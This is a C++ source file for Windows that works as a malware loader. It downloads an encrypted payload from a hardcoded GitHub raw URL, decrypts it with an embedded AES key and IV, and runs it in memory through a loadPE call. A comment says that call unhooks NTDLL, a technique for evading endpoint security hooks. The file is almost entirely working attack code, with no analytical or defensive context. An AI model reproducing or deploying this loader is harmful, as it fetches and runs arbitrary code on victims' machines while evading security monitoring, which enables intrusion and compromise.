#include <windows.h>
#include <wininet.h>
#include <bcrypt.h>
#include <iostream>
#include <vector>
#include <fstream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "bcrypt.lib")

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif

#include "helpers.h"

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
    BOOL bSTATE = TRUE;
    HINTERNET hInternet = NULL, hInternetFile = NULL;
    DWORD dwBytesRead = 0;
    SIZE_T sSize = 0;
    PBYTE pBytes = NULL, pTmpBytes = NULL;

    hInternet = InternetOpenW(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cerr << "[!] InternetOpenW Failed With Error : " << GetLastError() << std::endl;
        bSTATE = FALSE; goto _EndOfFunction;
    }

    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hInternetFile == NULL) {
        std::cerr << "[!] InternetOpenUrlW Failed With Error : " << GetLastError() << std::endl;
        bSTATE = FALSE; goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE) {
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            std::cerr << "[!] InternetReadFile Failed With Error: " << GetLastError() << std::endl;
            bSTATE = FALSE; goto _EndOfFunction;
        }

        sSize += dwBytesRead;
        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet) InternetCloseHandle(hInternet);
    if (hInternetFile) InternetCloseHandle(hInternetFile);
    if (hInternet) InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    if (pTmpBytes) LocalFree(pTmpBytes);
    return bSTATE;
}

BOOL DecryptPayload(PBYTE pbCipherText, DWORD cbCipherText, PBYTE pbKey, DWORD cbKey, PBYTE pbIV, DWORD cbIV, PBYTE* ppbPlainText, DWORD* pcbPlainText) {
    BCRYPT_ALG_HANDLE hAesAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    DWORD cbData = 0, cbPlainText = 0;
    PBYTE pbPlainText = NULL;

    status = BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        std::cerr << "[!] BCryptOpenAlgorithmProvider Failed With Error: " << status << std::endl;
        goto Cleanup;
    }

    status = BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        std::cerr << "[!] BCryptSetProperty Failed With Error: " << status << std::endl;
        goto Cleanup;
    }

    status = BCryptGenerateSymmetricKey(hAesAlg, &hKey, NULL, 0, pbKey, cbKey, 0);
    if (!BCRYPT_SUCCESS(status)) {
        std::cerr << "[!] BCryptGenerateSymmetricKey Failed With Error: " << status << std::endl;
        goto Cleanup;
    }

    status = BCryptDecrypt(hKey, pbCipherText, cbCipherText, NULL, pbIV, cbIV, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        std::cerr << "[!] BCryptDecrypt (get size) Failed With Error: " << status << std::endl;
        goto Cleanup;
    }

    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        std::cerr << "[!] HeapAlloc Failed With Error: " << GetLastError() << std::endl;
        goto Cleanup;
    }

    status = BCryptDecrypt(hKey, pbCipherText, cbCipherText, NULL, pbIV, cbIV, pbPlainText, cbPlainText, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        std::cerr << "[!] BCryptDecrypt Failed With Error: " << status << std::endl;
        goto Cleanup;
    }

    *ppbPlainText = pbPlainText;
    *pcbPlainText = cbPlainText;

Cleanup:
    if (hAesAlg) BCryptCloseAlgorithmProvider(hAesAlg, 0);
    if (hKey) BCryptDestroyKey(hKey);
    if (!BCRYPT_SUCCESS(status) && pbPlainText) HeapFree(GetProcessHeap(), 0, pbPlainText);

    return BCRYPT_SUCCESS(status);
}

BOOL SaveToFile(LPCSTR filePath, PBYTE pData, DWORD dataSize) {
    std::ofstream outFile(filePath, std::ios::binary);
    if (!outFile) {
        std::cerr << "[!] Failed to open file for writing: " << filePath << std::endl;
        return FALSE;
    }
    outFile.write(reinterpret_cast<const char*>(pData), dataSize);
    outFile.close();
    return TRUE;
}

int main() {
    LPCWSTR url = L"https://github.com/LNodesL/FSTC-August-2024/raw/d2b6ad4fda92b3df62b99243c8591446ca46446e/files/Payload.fstc";
    PBYTE pPayload = NULL;
    SIZE_T sPayloadSize = 0;

    if (!GetPayloadFromUrl(url, &pPayload, &sPayloadSize)) {
        std::cerr << "[!] Failed to get payload from URL." << std::endl;
        return 1;
    }

    BYTE key[] = { 0x32, 0x6a, 0xff, 0xde, 0x1b, 0x38, 0x24, 0x2a, 0xbf, 0x36, 0xfc, 0xab, 0xc3, 0xc9, 0x8e, 0x0f, 0xbd, 0x4c, 0xf8, 0x53, 0x85, 0x02, 0xa0, 0xd0, 0x10, 0xa3, 0xf7, 0x7c, 0x95, 0xec, 0x6d, 0x9d };
    BYTE iv[] = { 0xff, 0x48, 0x2e, 0x79, 0x3f, 0xd8, 0x81, 0x50, 0x73, 0x59, 0x78, 0xad, 0x67, 0x14, 0x2d, 0xee };
    DWORD keySize = sizeof(key);
    DWORD ivSize = sizeof(iv);

    PBYTE pPlainText = NULL;
    DWORD plainTextSize = 0;

    if (!DecryptPayload(pPayload, sPayloadSize, key, keySize, iv, ivSize, &pPlainText, &plainTextSize)) {
        std::cerr << "[!] Failed to decrypt payload." << std::endl;
        LocalFree(pPayload);
        return 1;
    }

    // Unhook NTDLL and load the PE directly from memory
    loadPE(pPlainText, plainTextSize);

    // Cleanup
    HeapFree(GetProcessHeap(), 0, pPlainText);
    LocalFree(pPayload);

    return 0;
}
